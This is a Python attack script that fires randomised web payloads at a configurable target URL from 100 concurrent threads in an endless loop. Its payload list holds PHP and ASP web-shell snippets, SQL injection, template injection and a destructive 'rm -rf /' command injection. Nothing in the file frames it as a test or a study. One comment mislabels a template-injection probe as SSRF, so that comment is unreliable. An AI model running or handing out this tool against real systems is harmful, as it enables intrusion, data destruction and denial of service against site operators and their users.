import requests
import threading
import random
import time
import sys

# Configuration
TARGET = "http://example.com"  # Replace with target
THREADS = 100
PAYLOADS = [
    "<?php system($_GET['cmd']); ?>",
    "<% eval request('cmd') %>",
    "{{7*7}}",  # SSRF-style payload
    "' OR 1=1--",
    "`rm -rf /`",
    "ping -c 10 127.0.0.1",
    "${@print(md5(1))}",
]
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Payload Sender
def send_payload():
    while True:
        payload = random.choice(PAYLOADS)
        try:
            requests.post(
                TARGET,
                data={"cmd": payload},
                headers=HEADERS,
                timeout=3
            )
        except:
            pass
        time.sleep(random.uniform(0.1, 0.5))

# Main Launcher
def main():
    for _ in range(THREADS):
        t = threading.Thread(target=send_payload)
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    main()